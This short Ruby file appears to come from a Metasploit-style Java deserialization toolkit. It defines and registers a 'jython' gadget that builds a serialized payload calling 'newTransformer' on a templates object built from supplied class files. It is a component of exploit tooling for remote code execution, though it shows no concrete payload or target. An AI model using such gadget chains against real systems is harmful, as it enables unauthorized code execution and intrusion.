# -*- coding: binary -*-
require_relative '../../payloads/jython'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class Jython < S::Generator::Gadget
  def id
    'jython'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('jython')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Payloads::Templates.supported(ctx, params)
    end

    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/jython.json')

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::Jython.make_invoke_noarg(
        S::Generator::Templates.make(ctx,params), 
        'newTransformer')
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Jython.new
)
